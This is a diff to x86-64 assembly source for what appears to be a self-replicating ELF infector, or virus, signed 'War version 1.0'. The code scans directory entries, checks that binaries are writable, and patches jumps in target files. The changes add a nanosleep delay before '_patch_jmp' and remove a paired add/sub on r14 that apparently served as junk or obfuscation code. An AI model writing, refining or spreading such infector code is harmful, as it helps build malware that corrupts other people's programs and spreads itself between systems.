@@ -8,6 +8,7 @@
 %define SYS_MPROTECT		10
 %define SYS_PREAD64			17
 %define SYS_PWRITE64		18
+%define SYS_NANOSLEEP		35
 %define SYS_EXIT			60
 %define SYS_CHDIR			80
 %define SYS_PTRACE			101
@@ -433,7 +434,6 @@ _dirent_tmp_test:                                  ; getdents the directory to i
 		
 		cmp rax, 0
 		jne _continue_dirent
-		add r14, [r15]
 
 	_check_file_flags:                             ; check if if the program can read and write over the binary
 		lea rax, [r15 + 56]
@@ -452,7 +452,6 @@ _dirent_tmp_test:                                  ; getdents the directory to i
 
 		imul rax, rax, 1
 
-		sub r14, [r15]
 		nop
 		lea rax, [r15 + 56]
 		nop
@@ -726,7 +725,11 @@ _dirent_tmp_test:                                  ; getdents the directory to i
 
 			mov rax, SYS_SYNC
 			syscall
-
+		_nanosleep:
+			mov rax, SYS_NANOSLEEP
+			lea rdi, ns
+			mov rsi, 0
+			syscall
 		_patch_jmp:
 			mov rax, SYS_LSEEK
 			mov rdi, [r15 + 1420]
@@ -785,7 +788,8 @@ war:
 	db 0,'War version 1.0 (c)oded by Core Contributor darodrig-rcabezas, Lord Commander of the Night', 0x27 ,'s Watch - '
 _timestamp:
 	db 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49, 0x00				; 11111111
-	
+nanoseconds:
+	ns dq 0, 1
 _close_folder:
 	mov rdi, [r15 + 16]
 	mov rax, SYS_CLOSE
